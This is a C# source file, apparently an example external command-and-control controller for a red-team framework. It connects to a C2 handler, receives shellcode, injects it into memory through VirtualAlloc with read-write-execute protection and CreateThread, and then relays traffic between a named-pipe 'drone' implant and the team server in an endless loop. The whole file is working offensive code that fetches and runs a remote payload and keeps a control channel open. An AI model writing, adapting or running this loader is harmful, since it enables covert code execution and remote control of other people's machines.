using System.IO.Pipes;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

namespace ExampleController;

internal static class Program
{
    public static async Task Main(string[] args)
    {
        // connect to external c2 handler
        var client = new TcpClient();
        await client.ConnectAsync("127.0.0.1", 6666);

        var stream = client.GetStream();
        
        // generate and send a pipename
        var pipeName = Guid.NewGuid().ToString();
        await stream.WriteStream(Encoding.UTF8.GetBytes(pipeName));
        
        // read the shellcode back
        var shellcode = await stream.ReadStream();
        
        // inject it
        InjectDrone(shellcode);
        
        // connect to named pipe
        var pipeClient = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
        await pipeClient.ConnectAsync();

        // run in a loop
        while (true)
        {
            // if the drone has anything to give us
            if (pipeClient.DataAvailable())
            {
                var inbound = await pipeClient.ReadStream();
                if (inbound.Length > 0)
                    await stream.WriteStream(inbound);
            }

            // if the team server has anything to give us
            if (stream.DataAvailable())
            {
                var outbound = await stream.ReadStream();
                if (outbound.Length > 0)
                    await pipeClient.WriteStream(outbound);
            }

            await Task.Delay(100);
        }
    }

    private static void InjectDrone(byte[] shellcode)
    {
        var hMemory = Win32.VirtualAlloc(
            IntPtr.Zero,
            shellcode.Length,
            Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
            Win32.MemoryProtection.ExecuteReadWrite);
        
        Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

        _ = Win32.CreateThread(
            IntPtr.Zero,
            0,
            hMemory,
            IntPtr.Zero,
            0,
            IntPtr.Zero);
    }
}

